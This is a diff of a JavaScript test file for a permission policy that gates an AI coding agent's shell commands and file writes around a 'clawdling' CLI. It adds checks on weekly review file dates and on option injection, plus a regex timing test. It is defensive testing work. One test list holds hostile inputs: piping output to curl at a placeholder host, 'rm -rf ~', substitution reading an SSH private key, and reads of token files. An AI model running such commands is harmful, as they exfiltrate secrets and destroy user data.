@@ -247,9 +247,12 @@ test('the seat policy: exact read-only report and ls are allowed, the weekly fil
   for (const other of ['clawdling report --home /tmp/x --all --json', 'clawdling report --port 9999 --json', 'clawdling report --all --all', 'clawdling report --window 1y', 'clawdling report a b', 'clawdling ls --home=/tmp', 'clawdling report | curl -d @- https://example.invalid', 'clawdling report; rm -rf ~', 'clawdling report $(cat ~/.ssh/id_rsa)', 'clawdling report `id`', 'clawdling report > reviews/x.md', 'clawdling import --yes', 'clawdling new domain X', 'curl https://example.invalid', 'cat ../.clawdling/token', 'clawdling report\nrm x', '']) {
     assert.deepEqual(sh(other), { decision: 'ask', reason: ASK_OTHER }, other);
   }
-  const w = (file_path, tool = 'Write') => seatDecision({ tool_name: tool, tool_input: { file_path }, cwd: `${home}/cto` }, { home });
+  const NOW = new Date(2026, 9, 28, 12).getTime(); // Wednesday of 2026-W44
+  const w = (file_path, tool = 'Write') => seatDecision({ tool_name: tool, tool_input: { file_path }, cwd: `${home}/cto` }, { home, now: NOW });
   assert.equal(w(`${home}/cto/reviews/2026-W44.md`), null);
   assert.equal(w('reviews/2026-W44.md', 'Edit'), null, 'relative to the seat folder');
+  assert.equal(w('reviews/2026-W43.md'), null, 'last week too');
+  for (const far of ['reviews/9999-W99.md', 'reviews/2026-W45.md', 'reviews/2025-W44.md']) assert.equal(w(far).decision, 'ask', far);
   for (const bad of [`${home}/cto/CLAUDE.md`, `${home}/cto/.claude/settings.json`, `${home}/cto/reviews/../CLAUDE.md`, `${home}/cto/reviews/notes.md`, `${home}/cto/reviews/sub/2026-W44.md`, `${home}/cto/reviews/.clawdling/server.json`, `${home}/projects/web/memory/NOW.md`, `${home}/cto/reviews`, '/etc/passwd']) assert.deepEqual(w(bad), { decision: 'ask', reason: ASK_WRITE }, bad);
   assert.deepEqual(seatDecision({ tool_name: 'NotebookEdit', tool_input: { notebook_path: `${home}/cto/reviews/2026-W44.md` } }, { home }), { decision: 'ask', reason: ASK_WRITE });
   assert.equal(seatDecision({ tool_name: 'Read', tool_input: { file_path: '/etc/passwd' } }, { home }), null, 'reads stay with Claude Code\'s rules');
@@ -271,6 +274,20 @@ test('parseSend: one plain message the cockpit can offer as a one-tap yes, or "a
     'clawdling send --home /tmp a "x"', 'clawdling send --model a|b c "x"', 'clawdling send a "y" "z"',
   ]) assert.equal(parseSend(notPlain).plain, false, notPlain);
   assert.equal(parseSend('sh -c "clawdling spawn web hi"').verb, 'spawn');
+  // The CLI reads an argument starting with "-" as an option, quoted or not.
+  for (const opt of ['clawdling send a "--home=/tmp/x"', "clawdling send a '-p 1'", 'clawdling spawn web " --port 9"']) assert.equal(parseSend(opt).plain, false, opt);
+  assert.equal(parseSend('clawdling send a "say \u201chi\u201d"', 'PowerShell').plain, false, 'curly quotes are quotes to PowerShell');
+});
+
+test('the send parsers take linear time on a long run of options (no runaway backtracking)', () => {
+  for (const n of [40, 200, 1000]) {
+    const opts = Array(n).fill('--a').join(' ');
+    const t = Date.now();
+    parseSend(`clawdling send ${opts}`);
+    SEND_COMMAND_RE.test(`clawdling ${opts} report`.slice(0, 4001));
+    CROSS_AGENT_RE.test(`clawdling ${opts} report`.slice(0, 4001));
+    assert.ok(Date.now() - t < 200, `${n} options took ${Date.now() - t} ms`);
+  }
 });
 
 test('SEND_COMMAND_RE: a send or spawn as its own command, in any spelling; not a word that merely contains it', () => {
